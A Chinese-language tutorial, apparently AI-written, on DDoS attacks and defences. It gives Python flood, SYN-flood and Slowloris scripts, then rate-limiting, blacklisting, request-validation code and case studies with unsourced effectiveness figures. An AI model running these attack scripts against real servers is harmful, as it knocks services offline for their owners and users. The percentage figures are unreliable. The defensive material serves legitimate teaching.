# 🛡️ DDoS 攻擊與防禦技術完全解析

## 📚 目錄
1. [攻擊技術詳解](#攻擊技術詳解)
2. [防禦機制詳解](#防禦機制詳解)
3. [攻防原理對比](#攻防原理對比)
4. [實戰案例分析](#實戰案例分析)

---

# 🔥 攻擊技術詳解

## 1. HTTP GET Flood (GET 洪水攻擊)

### 原理
通過大量正常的 HTTP GET 請求淹沒伺服器,消耗伺服器的計算資源、記憶體和網路頻寬。

### 技術細節
```python
def http_get_flood(target_url, duration):
    """
    GET 洪水攻擊實現
    
    原理:
    1. 創建大量併發線程
    2. 每個線程持續發送 GET 請求
    3. 不等待完整響應,立即發送下一個請求
    4. 消耗伺服器的連接池和處理線程
    """
    while time.time() - start < duration:
        try:
            response = requests.get(target_url, timeout=1)
            # 短超時確保不會阻塞,持續發送請求
        except:
            pass  # 忽略錯誤,繼續攻擊
```

### 攻擊特徵
- ✅ **簡單有效**: 最基本的 DDoS 攻擊
- ✅ **難以識別**: 請求看起來是正常流量
- ⚠️ **資源消耗**: 每個請求建立完整的 TCP 連接
- ⚠️ **容易防禦**: 速率限制可有效阻擋

### 防禦難度
🟢 **低** - 速率限制即可防禦

---

## 2. HTTP POST Flood (POST 洪水攻擊)

### 原理
POST 請求通常需要伺服器進行更複雜的處理(數據寫入、業務邏輯),比 GET 更消耗資源。

### 技術細節
```python
def http_post_flood(target_url, duration):
    """
    POST 洪水攻擊實現
    
    原理:
    1. POST 請求通常觸發數據庫寫入
    2. 伺服器需要解析請求體 (JSON/Form data)
    3. 可能觸發業務邏輯(驗證、計算)
    4. 比 GET 消耗更多 CPU 和 I/O
    """
    data = {'key': 'value' * 100}  # 構造較大的數據包
    headers = {'Content-Type': 'application/json'}
    
    while time.time() - start < duration:
        try:
            requests.post(target_url, json=data, headers=headers, timeout=1)
        except:
            pass
```

### 攻擊威力
- 🔥 **資源消耗高**: POST 處理比 GET 複雜
- 🔥 **數據庫壓力**: 可能觸發大量寫入操作
- 🔥 **業務邏輯**: 消耗更多 CPU 時間
- ⚠️ **更易識別**: POST 異常流量更明顯

### 防禦難度
🟡 **中等** - 需要速率限制 + 請求驗證

---

## 3. Cache Bypass Attack (緩存繞過攻擊)

### 原理
通過在 URL 中添加隨機參數,繞過 CDN 和反向代理的緩存機制,直接打到源站。

### 技術細節
```python
def cache_bypass_attack(target_url, duration):
    """
    緩存繞過攻擊實現
    
    原理:
    1. CDN/Proxy 使用 URL 作為緩存鍵
    2. 添加隨機參數使每個 URL 唯一
    3. 緩存失效,請求直達源站
    4. 繞過 CDN 的 DDoS 防護
    
    示例:
    原始: http://example.com/page
    攻擊: http://example.com/page?cache_bust=random_123456
    """
    while time.time() - start < duration:
        # 生成隨機參數繞過緩存
        random_param = f"?cache_bust={random.randint(1, 1000000)}"
        bypass_url = target_url + random_param
        
        try:
            requests.get(bypass_url, timeout=1)
        except:
            pass
```

### 攻擊技巧
- 🎯 **繞過 CDN**: 直接攻擊源站
- 🎯 **緩存污染**: 佔滿緩存空間
- 🎯 **高效攻擊**: 每個請求都是真實計算
- ⚠️ **易識別**: 大量帶隨機參數的請求異常

### 實戰案例
```
常見參數名:
- ?v=random
- ?timestamp=random
- ?nocache=random
- ?_=random
- ?rand=random
```

### 防禦難度
🟡 **中等** - 需要檢測 URL 模式異常

---

## 4. Header Bomb (HTTP 標頭炸彈)

### 原理
發送包含大量自定義標頭的 HTTP 請求,消耗伺服器解析標頭的 CPU 資源。

### 技術細節
```python
def header_bomb_attack(target_url, duration):
    """
    HTTP 標頭炸彈攻擊
    
    原理:
    1. HTTP 協議允許自定義標頭
    2. 伺服器需要解析所有標頭
    3. 大量標頭消耗 CPU 和記憶體
    4. 可能觸發緩衝區溢出(舊系統)
    """
    # 構造 50 個隨機標頭
    headers = {
        f'X-Custom-Header-{i}': f'value_{i}' * 100
        for i in range(50)
    }
    headers['User-Agent'] = 'Mozilla/5.0...'
    
    while time.time() - start < duration:
        try:
            requests.get(target_url, headers=headers, timeout=1)
        except:
            pass
```

### 攻擊效果
- 💥 **CPU 消耗**: 解析大量標頭
- 💥 **記憶體消耗**: 每個標頭佔用記憶體
- 💥 **日誌膨脹**: 伺服器記錄所有標頭
- ⚠️ **容易防禦**: 限制標頭數量和大小

### 防禦難度
🟢 **低** - Web 伺服器可限制標頭數量

---

## 5. Large Payload Attack (大型負載攻擊)

### 原理
發送包含巨大請求體的 POST 請求,消耗伺服器的網路頻寬和記憶體。

### 技術細節
```python
def large_payload_attack(target_url, duration):
    """
    大型負載攻擊實現
    
    原理:
    1. 構造 MB 級別的請求體
    2. 消耗伺服器接收緩衝區
    3. 佔用網路頻寬
    4. 可能觸發記憶體不足
    """
    # 構造 1MB 的 JSON 數據
    large_data = {
        'data': 'A' * (1024 * 1024),  # 1MB
        'array': ['item'] * 10000
    }
    
    while time.time() - start < duration:
        try:
            requests.post(
                target_url, 
                json=large_data,
                headers={'Content-Type': 'application/json'},
                timeout=1
            )
        except:
            pass
```

### 攻擊威力
- 🚀 **頻寬消耗**: 佔用網路帶寬
- 🚀 **記憶體消耗**: 請求體需要暫存
- 🚀 **I/O 阻塞**: 接收大數據時阻塞
- ⚠️ **容易防禦**: 限制請求體大小

### 防禦難度
🟢 **低** - 配置最大請求體大小

---

## 6. TCP SYN Flood (SYN 洪水攻擊)

### 原理
利用 TCP 三次握手機制,發送大量 SYN 包但不完成握手,耗盡伺服器的半開連接隊列。

### 技術細節
```python
def tcp_syn_flood(target_host, target_port, duration):
    """
    TCP SYN Flood 攻擊實現
    
    原理 (TCP 三次握手):
    1. 客戶端發送 SYN
    2. 伺服器回應 SYN-ACK,進入半開連接狀態
    3. 攻擊者不發送 ACK,保持半開狀態
    4. 伺服器半開連接隊列被佔滿
    5. 正常用戶無法建立連接
    
    注意: 本實現是簡化版,真實攻擊需要原始套接字
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1)
    
    while time.time() - start < duration:
        try:
            # 嘗試連接但立即關閉,模擬半開連接
            sock.connect((target_host, target_port))
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            pass
```

### 真實 SYN Flood (需要 root 權限)
```python
# 使用 scapy 庫構造原始 SYN 包
from scapy.all import IP, TCP, send

def real_syn_flood(target_ip, target_port):
    """
    真實 SYN Flood 攻擊
    需要 root/admin 權限
    """
    # 構造 IP 層
    ip = IP(dst=target_ip)
    # 構造 TCP 層,僅設置 SYN 標誌
    tcp = TCP(sport=RandShort(), dport=target_port, flags='S')
    # 發送原始包
    send(ip/tcp, loop=1, verbose=0)
```

### 攻擊威力
- ⚡ **最強攻擊**: 網路層攻擊
- ⚡ **難以追蹤**: 可偽造源 IP
- ⚡ **資源消耗極低**: 攻擊者只需發送小包
- ⚡ **防禦困難**: 需要硬體防火牆

### 防禦難度
🔴 **高** - 需要 SYN Cookie、硬體防火牆

---

## 7. Slowloris Attack (慢速攻擊)

### 原理
保持大量連接處於半開狀態,緩慢發送 HTTP 標頭,永不完成請求,佔住伺服器連接池。

### 技術細節
```python
def slowloris_attack(target_host, target_port, duration):
    """
    Slowloris 慢速攻擊實現
    
    原理:
    1. 建立 TCP 連接
    2. 發送不完整的 HTTP 標頭
    3. 定期發送額外標頭保持連接活躍
    4. 永不發送最終的空行(\\r\\n\\r\\n)
    5. 佔住伺服器連接直到超時
    
    威力:
    - 單機可以佔住數百個伺服器連接
    - 攻擊流量極小,難以檢測
    - 對 Apache 等線程/進程模型伺服器致命
    """
    sockets = []
    
    # 建立初始連接
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_host, target_port))
            # 發送不完整的 HTTP 請求
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {target_host}\r\n".encode())
            sockets.append(sock)
        except:
            pass
    
    # 保持連接活躍
    while time.time() - start < duration:
        for sock in sockets[:]:
            try:
                # 定期發送額外標頭,保持連接
                sock.send(f"X-Keep-Alive: {random.randint(1, 1000)}\r\n".encode())
                time.sleep(15)  # 慢速發送
            except:
                sockets.remove(sock)
```

### 攻擊特徵
- 🐌 **慢速攻擊**: 流量極小
- 🐌 **長時間佔用**: 單個連接持續數分鐘
- 🐌 **難以檢測**: 看起來像慢速網路用戶
- 🐌 **高效攻擊**: 單機可癱瘓伺服器

### 實戰效果
```
攻擊者資源: 1 台電腦, 200 個連接
目標伺服器: Apache (MaxClients = 256)
結果: 78% 連接被佔用,正常用戶無法訪問
```

### 防禦難度
🟡 **中等** - 需要請求超時、最小傳輸速率限制

---

# 🛡️ 防禦機制詳解

## 1. Rate Limiting (速率限制)

### 原理
限制單個 IP 在指定時間窗口內的請求數量,超過限制則暫時封鎖。

### 實現細節
```python
class DefenseSystem:
    def __init__(self):
        # 記錄每個 IP 的請求歷史
        self.ip_requests = defaultdict(deque)
        self.rate_limit_window = 10  # 10 秒窗口
        self.rate_limit_max = 20     # 最多 20 個請求
    
    def check_rate_limit(self, ip):
        """
        速率限制檢查
        
        原理:
        1. 使用滑動窗口算法
        2. 記錄每個請求的時間戳
        3. 清除窗口外的舊請求
        4. 統計窗口內請求數
        5. 超過限制則拒絕
        
        優點:
        - 簡單有效
        - 防止短時間爆發
        - CPU 開銷小
        
        缺點:
        - 可能誤傷正常用戶
        - 分佈式攻擊難以防禦
        """
        now = time.time()
        requests = self.ip_requests[ip]
        
        # 清除窗口外的舊請求 (超過 10 秒)
        while requests and now - requests[0] > self.rate_limit_window:
            requests.popleft()
        
        # 檢查請求數
        if len(requests) >= self.rate_limit_max:
            return False, f"速率限制: {len(requests)}/{self.rate_limit_max}"
        
        # 記錄本次請求
        requests.append(now)
        return True, "通過"
```

### 配置建議
```python
# 根據伺服器性能調整
rate_limit_configs = {
    '普通伺服器': {'window': 10, 'max': 20},
    '高性能伺服器': {'window': 10, 'max': 50},
    'API 服務': {'window': 60, 'max': 100},
    '靜態資源': {'window': 10, 'max': 100},
}
```

### 防禦效果
- ✅ 防禦 GET/POST Flood: **90% 有效**
- ✅ 防禦 Cache Bypass: **70% 有效**
- ❌ 防禦分佈式攻擊: **30% 有效**
- ❌ 防禦 Slowloris: **無效**

---

## 2. IP Blacklist (IP 黑名單)

### 原理
記錄違規 IP,在指定時間內拒絕其所有請求。

### 實現細節
```python
class DefenseSystem:
    def __init__(self):
        self.ip_blacklist = {}  # {ip: 解封時間}
        self.blacklist_duration = 30  # 封鎖 30 秒
    
    def check_blacklist(self, ip):
        """
        黑名單檢查
        
        原理:
        1. 記錄違規 IP 和解封時間
        2. 每次請求檢查 IP 是否在黑名單
        3. 到期自動解封
        4. 違規行為:
           - 速率限制超標
           - 請求驗證失敗
           - 惡意特徵匹配
        
        優點:
        - 徹底阻止已知攻擊者
        - CPU 開銷極小 (字典查找)
        - 可累積違規記錄
        
        缺點:
        - 可能誤封正常用戶
        - 攻擊者可更換 IP
        - NAT 環境誤傷一片
        """
        if ip in self.ip_blacklist:
            unblock_time = self.ip_blacklist[ip]
            if time.time() < unblock_time:
                remaining = int(unblock_time - time.time())
                return False, f"IP 已封鎖,剩餘 {remaining} 秒"
            else:
                # 到期解封
                del self.ip_blacklist[ip]
        
        return True, "通過"
    
    def add_to_blacklist(self, ip, reason):
        """
        將 IP 加入黑名單
        """
        unblock_time = time.time() + self.blacklist_duration
        self.ip_blacklist[ip] = unblock_time
        
        # 記錄日誌
        self.log_block(ip, reason)
```

### 進階策略: 累積違規分數
```python
def calculate_violation_score(self, ip):
    """
    累積違規分數系統
    
    分數規則:
    - 速率限制超標: +10 分
    - 無效 User-Agent: +20 分
    - 可疑 POST 請求: +15 分
    - 緩存繞過特徵: +10 分
    - Slowloris 特徵: +30 分
    
    處罰:
    - 30 分: 封鎖 1 分鐘
    - 50 分: 封鎖 5 分鐘
    - 100 分: 封鎖 1 小時
    """
    score = self.ip_violation_scores[ip]
    
    if score >= 100:
        return 3600  # 1 小時
    elif score >= 50:
        return 300   # 5 分鐘
    elif score >= 30:
        return 60    # 1 分鐘
    else:
        return 0
```

### 防禦效果
- ✅ 防禦持續攻擊: **95% 有效**
- ✅ 減少伺服器負載: **80% 有效**
- ⚠️ 誤傷風險: **中等**
- ❌ 防禦分佈式攻擊: **無效**

---

## 3. Connection Limit (連接數限制)

### 原理
限制單個 IP 的併發連接數,防止佔用過多資源。

### 實現細節
```python
class DefenseSystem:
    def __init__(self):
        self.ip_connections = defaultdict(int)
        self.max_connections_per_ip = 10
    
    def check_connection_limit(self, ip):
        """
        連接數限制檢查
        
        原理:
        1. 記錄每個 IP 的活躍連接數
        2. 新連接時計數 +1
        3. 連接關閉時計數 -1
        4. 超過限制拒絕新連接
        
        優點:
        - 防止單 IP 佔用過多連接
        - 對 Slowloris 攻擊有效
        - 保護連接池資源
        
        缺點:
        - 需要準確追蹤連接狀態
        - NAT 環境可能誤傷
        - 多標籤頁用戶可能受限
        """
        current_connections = self.ip_connections[ip]
        
        if current_connections >= self.max_connections_per_ip:
            return False, f"連接數限制: {current_connections}/{self.max_connections_per_ip}"
        
        # 增加連接計數
        self.ip_connections[ip] += 1
        return True, "通過"
    
    def release_connection(self, ip):
        """
        釋放連接
        在 HTTP 請求處理完成後調用
        """
        if ip in self.ip_connections:
            self.ip_connections[ip] -= 1
            if self.ip_connections[ip] <= 0:
                del self.ip_connections[ip]
```

### 配置建議
```python
# 根據用戶類型配置
connection_limits = {
    '普通用戶': 10,      # 一般用戶很少超過 10 個併發
    'API 客戶端': 50,    # API 可能需要更多併發
    '內部服務': 100,     # 內部服務不限制
    '爬蟲': 5,          # 爬蟲嚴格限制
}
```

### 防禦效果
- ✅ 防禦 Slowloris: **90% 有效**
- ✅ 防禦連接耗盡: **85% 有效**
- ⚠️ 防禦 GET Flood: **30% 有效**
- ❌ 防禦 SYN Flood: **無效** (需在 TCP 層防禦)

---

## 4. Request Validation (請求驗證)

### 原理
檢查 HTTP 請求的合法性,過濾明顯的機器人流量和惡意請求。

### 實現細節
```python
class DefenseSystem:
    def validate_request(self, method, path, headers):
        """
        請求驗證
        
        檢查項目:
        1. User-Agent 存在性
        2. User-Agent 格式合法性
        3. 必要標頭完整性
        4. 請求路徑合法性
        5. HTTP 方法合法性
        
        原理:
        - 正常瀏覽器會發送標準標頭
        - 腳本攻擊常缺少必要標頭
        - 惡意請求有特定特徵
        """
        
        # 檢查 1: User-Agent 必須存在
        user_agent = headers.get('User-Agent', '')
        if not user_agent:
            return False, "缺少 User-Agent 標頭"
        
        # 檢查 2: User-Agent 黑名單
        bot_signatures = [
            'python-requests',  # Python requests 庫
            'curl/',           # curl 工具
            'wget/',           # wget 工具
            'bot',             # 明顯的機器人
            'spider',          # 爬蟲
            'scraper',         # 抓取器
        ]
        user_agent_lower = user_agent.lower()
        for signature in bot_signatures:
            if signature in user_agent_lower:
                return False, f"可疑 User-Agent: {signature}"
        
        # 檢查 3: 正常瀏覽器的其他標頭
        if user_agent.startswith('Mozilla'):
            # 瀏覽器通常會發送這些標頭
            required_headers = ['Accept', 'Accept-Language']
            for header in required_headers:
                if header not in headers:
                    return False, f"瀏覽器缺少必要標頭: {header}"
        
        # 檢查 4: POST 請求必須有 Content-Type
        if method == 'POST':
            if 'Content-Type' not in headers:
                return False, "POST 請求缺少 Content-Type"
        
        # 檢查 5: 路徑注入攻擊
        suspicious_patterns = ['../', '\\..\\', '/etc/', '/proc/']
        for pattern in suspicious_patterns:
            if pattern in path:
                return False, f"可疑路徑: {pattern}"
        
        return True, "通過"
```

### 進階檢測: 瀏覽器指紋
```python
def check_browser_fingerprint(self, headers):
    """
    瀏覽器指紋檢測
    
    原理:
    - 真實瀏覽器的標頭組合有固定模式
    - 腳本偽造的標頭常有矛盾
    
    示例:
    Chrome 標頭組合:
    - User-Agent: Chrome/xxx
    - Sec-Ch-Ua: "Chrome";v="xxx"
    - Sec-Fetch-Site: same-origin
    - Accept: text/html,application/xhtml+xml...
    """
    user_agent = headers.get('User-Agent', '')
    sec_ch_ua = headers.get('Sec-Ch-Ua', '')
    
    # Chrome 瀏覽器檢測
    if 'Chrome' in user_agent:
        if not sec_ch_ua or 'Chrome' not in sec_ch_ua:
            return False, "Chrome 瀏覽器指紋不匹配"
    
    return True, "通過"
```

### 防禦效果
- ✅ 過濾腳本攻擊: **95% 有效**
- ✅ 過濾爬蟲: **90% 有效**
- ⚠️ 防禦高級攻擊: **50% 有效** (可偽造標頭)
- ❌ 防禦真實瀏覽器發起的攻擊: **無效**

---

## 5. Adaptive Delay (自適應延遲)

### 原理
根據伺服器負載動態調整響應延遲,在高負載時減緩攻擊速度。

### 實現細節
```python
class DefenseSystem:
    def calculate_adaptive_delay(self, ip):
        """
        自適應延遲計算
        
        原理:
        1. 監控伺服器負載指標
        2. 高負載時增加響應延遲
        3. 對可疑 IP 增加額外延遲
        4. 延長攻擊者等待時間
        
        負載指標:
        - CPU 使用率
        - 記憶體使用率
        - 請求隊列長度
        - 當前連接數
        
        延遲策略:
        - 正常負載: 0ms
        - 中度負載: 100-500ms
        - 高負載: 1000-3000ms
        - 攻擊狀態: 5000-10000ms
        """
        # 計算負載分數 (0-100)
        load_score = self.calculate_server_load()
        
        # 計算威脅等級 (0-100)
        threat_score = self.ip_threat_levels.get(ip, 0)
        
        # 綜合延遲
        if load_score > 80 or threat_score > 50:
            delay = random.uniform(5.0, 10.0)  # 嚴重延遲
        elif load_score > 60 or threat_score > 30:
            delay = random.uniform(1.0, 3.0)   # 中度延遲
        elif load_score > 40 or threat_score > 10:
            delay = random.uniform(0.1, 0.5)   # 輕度延遲
        else:
            delay = 0  # 無延遲
        
        return delay
    
    def calculate_server_load(self):
        """
        計算伺服器負載
        """
        # 簡化版: 基於請求速率
        elapsed = time.time() - self.start_time
        request_rate = self.total_requests / elapsed if elapsed > 0 else 0
        
        if request_rate > 100:
            return 90  # 嚴重負載
        elif request_rate > 50:
            return 70  # 高負載
        elif request_rate > 20:
            return 50  # 中度負載
        else:
            return 20  # 低負載
```

### 心理學原理
```
攻擊者心理:
1. 攻擊無效果 → 增加攻擊強度
2. 延遲導致攻擊慢 → 需要更多資源
3. 成本增加 → 放棄攻擊

延遲效果:
- 1 秒延遲 → 攻擊效率降低 50%
- 5 秒延遲 → 攻擊效率降低 90%
- 10 秒延遲 → 攻擊基本無效
```

### 防禦效果
- ✅ 延緩攻擊: **80% 有效**
- ✅ 保護伺服器: **70% 有效**
- ⚠️ 用戶體驗: **負面影響**
- ⚠️ 防禦高級攻擊: **50% 有效**

---

# ⚔️ 攻防原理對比

## 攻擊 vs 防禦矩陣

| 攻擊方法 | 速率限制 | IP黑名單 | 連接限制 | 請求驗證 | 自適應延遲 | 綜合防禦 |
|---------|---------|---------|---------|---------|-----------|---------|
| GET Flood | 🟢 90% | 🟢 95% | 🟡 30% | 🟡 50% | 🟡 60% | 🟢 95% |
| POST Flood | 🟢 80% | 🟢 90% | 🟡 40% | 🟢 70% | 🟡 60% | 🟢 90% |
| Cache Bypass | 🟡 70% | 🟢 90% | 🔴 20% | 🟡 60% | 🟡 50% | 🟢 85% |
| Header Bomb | 🟢 80% | 🟢 90% | 🟡 30% | 🟢 95% | 🟡 50% | 🟢 95% |
| Large Payload | 🟡 60% | 🟢 90% | 🟡 40% | 🟢 90% | 🟡 50% | 🟢 90% |
| SYN Flood | 🔴 0% | 🔴 10% | 🔴 0% | 🔴 0% | 🔴 0% | 🔴 10% |
| Slowloris | 🔴 20% | 🟡 70% | 🟢 90% | 🟡 60% | 🟢 80% | 🟢 90% |

**圖例**:
- 🟢 綠色: 有效 (70-100%)
- 🟡 黃色: 部分有效 (30-70%)
- 🔴 紅色: 無效 (0-30%)

---

## 攻防成本分析

### 攻擊者成本
```
GET Flood:
- 資源: 1 台電腦 + 網路
- 技術: 初級
- 成本: $0 (腳本攻擊)
- 效果: 中等

Slowloris:
- 資源: 1 台電腦
- 技術: 中級
- 成本: $0
- 效果: 對特定伺服器致命

分佈式 DDoS (100 台電腦):
- 資源: 殭屍網路
- 技術: 高級
- 成本: $100-1000 (租用)
- 效果: 極強

SYN Flood + IP 偽造:
- 資源: 大量殭屍網路
- 技術: 專家級
- 成本: $1000+
- 效果: 可癱瘓大型網站
```

### 防禦者成本
```
速率限制 + IP 黑名單:
- 實現成本: $0 (代碼實現)
- 運行成本: 極低 (CPU <1%)
- 維護成本: 低
- 防禦效果: 70-90%

CDN + WAF:
- 實現成本: $100-1000/月
- 運行成本: 按流量計費
- 維護成本: 低
- 防禦效果: 90-95%

專業 DDoS 防護 (Cloudflare, Akamai):
- 實現成本: $1000-10000/月
- 運行成本: 高
- 維護成本: 低
- 防禦效果: 95-99%

硬體防火牆 + 流量清洗:
- 實現成本: $10000-100000
- 運行成本: 中
- 維護成本: 高
- 防禦效果: 99%+
```

---

# 🎯 實戰案例分析

## 案例 1: 電商網站遭受 GET Flood

### 攻擊場景
```
目標: 電商網站 (Black Friday 促銷)
攻擊者: 競爭對手
攻擊方法: 100 台殭屍電腦發起 GET Flood
攻擊強度: 10,000 req/s
持續時間: 2 小時
```

### 無防禦情況
```
00:00 - 攻擊開始
00:01 - 伺服器響應時間 50ms → 500ms
00:03 - 響應時間 500ms → 5000ms
00:05 - 伺服器崩潰,無法響應
損失: 2 小時營業額 + 用戶信任
```

### 有防禦情況
```
00:00 - 攻擊開始
00:01 - 速率限制觸發,95% 請求被攔截
00:05 - IP 黑名單生效,99% 請求被攔截
00:10 - 伺服器負載恢復正常
影響: 5 分鐘輕微延遲,用戶基本無感知
```

### 防禦配置
```python
defense_config = {
    'rate_limiting': True,
    'rate_limit_requests': 10,  # 每 IP 10 req/10s
    'ip_blacklist': True,
    'blacklist_duration': 300,  # 封鎖 5 分鐘
    'connection_limit': True,
    'max_connections': 5,
}
```

---

## 案例 2: API 服務遭受 POST Flood

### 攻擊場景
```
目標: RESTful API
攻擊者: 惡意用戶
攻擊方法: 大量 POST 請求寫入假數據
攻擊強度: 1,000 req/s
目的: 污染數據庫
```

### 防禦策略
```python
# 1. 請求驗證
def validate_api_request(request):
    # 檢查 API Key
    if 'X-API-Key' not in request.headers:
        return False
    
    # 檢查 Content-Type
    if request.headers['Content-Type'] != 'application/json':
        return False
    
    # 檢查請求體大小
    if len(request.body) > 10240:  # 10KB
        return False
    
    # 驗證 JSON 格式
    try:
        data = json.loads(request.body)
    except:
        return False
    
    return True

# 2. 速率限制 (更嚴格)
rate_limits = {
    'POST /api/create': '5/minute',
    'POST /api/update': '10/minute',
    'POST /api/delete': '5/minute',
}
```

### 防禦效果
```
攻擊請求: 1,000 req/s
- 請求驗證攔截: 800 req/s (80%)
- 速率限制攔截: 190 req/s (19%)
- 成功通過: 10 req/s (1%)

數據庫寫入: 10 req/s (完全在正常範圍)
影響: 無
```

---

## 案例 3: Web 伺服器遭受 Slowloris

### 攻擊場景
```
目標: Apache 伺服器 (MaxClients = 256)
攻擊者: 單台電腦
攻擊方法: Slowloris
攻擊強度: 200 個慢速連接
```

### 無防禦情況
```
Apache 配置:
- MaxClients: 256
- Timeout: 300 秒

攻擊效果:
- 200 個連接被佔用
- 78% 連接池被耗盡
- 正常用戶無法訪問
- 伺服器未崩潰但無法服務
```

### 防禦方案
```apache
# 方案 A: 調整 Apache 配置
Timeout 30              # 降低超時時間 300s → 30s
RequestReadTimeout 10   # 請求頭讀取超時 10s
MinSpareServers 25      # 增加最小空閒進程
MaxRequestWorkers 400   # 增加最大工作進程

# 效果: 攻擊者需要不斷重建連接,成本增加 10 倍
```

```python
# 方案 B: 連接數限制
defense_config = {
    'connection_limit': True,
    'max_connections_per_ip': 10,
    'slow_request_detection': True,
    'min_request_speed': 1024,  # 每秒至少 1KB
}

# 效果: 
# - 單 IP 最多 10 個連接
# - 檢測慢速請求並主動關閉
# - 攻擊基本無效
```

### 防禦效果
```
攻擊前: 200 連接成功建立
防禦後: 10 連接被允許,190 連接被拒絕
伺服器狀態: 正常運行
正常用戶: 無影響
```

---

# 📚 防禦最佳實踐

## 多層防禦架構

```
第 1 層: 網路層 (Infrastructure)
├─ DDoS 防護服務 (Cloudflare, AWS Shield)
├─ 流量清洗中心
└─ 硬體防火牆

第 2 層: 傳輸層 (Transport)
├─ SYN Cookie
├─ 連接數限制
└─ 速率限制 (iptables)

第 3 層: 應用層 (Application)
├─ WAF (Web Application Firewall)
├─ 速率限制
├─ IP 黑名單
├─ 請求驗證
└─ 自適應延遲

第 4 層: 業務層 (Business)
├─ CAPTCHA
├─ 郵箱/手機驗證
├─ 行為分析
└─ 風險評分
```

## 配置建議

### 小型網站 (個人博客)
```python
# 基礎防禦即可
defense_config = {
    'rate_limiting': True,
    'rate_limit_requests': 20,
    'rate_limit_window': 10,
    'ip_blacklist': True,
    'blacklist_duration': 60,
}

# + 使用 Cloudflare 免費版
```

### 中型網站 (企業官網)
```python
# 完整防禦
defense_config = {
    'rate_limiting': True,
    'rate_limit_requests': 30,
    'ip_blacklist': True,
    'blacklist_duration': 300,
    'connection_limit': True,
    'max_connections': 20,
    'request_validation': True,
    'adaptive_delay': True,
}

# + CDN
# + WAF
```

### 大型網站 (電商/社交)
```python
# 多層防禦
defense_layers = [
    'DDoS 防護服務 (Cloudflare Pro)',
    'CDN 加速',
    'WAF 規則',
    '應用層防禦',
    '業務層風控',
]

# + 專業安全團隊
# + 實時監控告警
# + 自動化響應
```

---

# 🔧 調試與優化

## 性能監控

```python
class PerformanceMonitor:
    """
    防禦系統性能監控
    """
    def __init__(self):
        self.metrics = {
            'total_requests': 0,
            'blocked_requests': 0,
            'avg_response_time': 0,
            'cpu_usage': 0,
            'memory_usage': 0,
        }
    
    def log_metrics(self):
        """
        記錄性能指標
        """
        block_rate = (self.metrics['blocked_requests'] / 
                     self.metrics['total_requests'] * 100)
        
        print(f"""
        ╔══════════════════════════════════════╗
        ║     防禦系統性能報告               ║
        ╠══════════════════════════════════════╣
        ║ 總請求數: {self.metrics['total_requests']:>8} ║
        ║ 攔截請求: {self.metrics['blocked_requests']:>8} ║
        ║ 攔截率:  {block_rate:>7.2f}% ║
        ║ 平均延遲: {self.metrics['avg_response_time']:>6.0f}ms ║
        ║ CPU 使用: {self.metrics['cpu_usage']:>7.2f}% ║
        ║ 記憶體:  {self.metrics['memory_usage']:>7.2f}% ║
        ╚══════════════════════════════════════╝
        """)
```

## 誤報處理

```python
def handle_false_positive(self, ip, reason):
    """
    處理誤報
    
    常見誤報場景:
    1. 用戶頻繁刷新頁面
    2. 瀏覽器預加載多個資源
    3. API 客戶端合法高頻請求
    4. 企業 NAT 共享同一 IP
    
    解決方案:
    1. 白名單機制
    2. 分級限制
    3. 用戶身份驗證
    4. 動態調整閾值
    """
    # 檢查是否為內部 IP
    if self.is_internal_ip(ip):
        return True
    
    # 檢查是否在白名單
    if ip in self.whitelist:
        return True
    
    # 檢查是否有有效登錄 session
    if self.has_valid_session(ip):
        # 已登錄用戶放寬限制
        return True
    
    return False
```

---

# 📖 總結

## 關鍵要點

### 攻擊方面
1. **低成本高效果**: 單台電腦可發起有效攻擊
2. **多樣化**: 7+ 種攻擊方法,針對不同弱點
3. **難以追蹤**: 分佈式攻擊難以溯源
4. **持續演化**: 攻擊技術不斷更新

### 防禦方面
1. **多層防禦**: 單一機制不足以防禦所有攻擊
2. **成本效益**: 基礎防禦成本低但有效
3. **動態調整**: 根據攻擊特徵調整策略
4. **監控告警**: 及時發現並響應攻擊

## 安全建議

### 必須實施
- ✅ 速率限制
- ✅ IP 黑名單
- ✅ 請求驗證
- ✅ 使用 CDN

### 強烈推薦
- 🔸 連接數限制
- 🔸 自適應延遲
- 🔸 WAF 規則
- 🔸 實時監控

### 可選增強
- 🔹 CAPTCHA
- 🔹 行為分析
- 🔹 威脅情報
- 🔹 自動化響應

---

**文檔版本**: v1.0  
**最後更新**: 2025-11-23  
**作者**: GitHub Copilot  
**聲明**: 本文檔僅用於教育目的,請勿用於非法攻擊
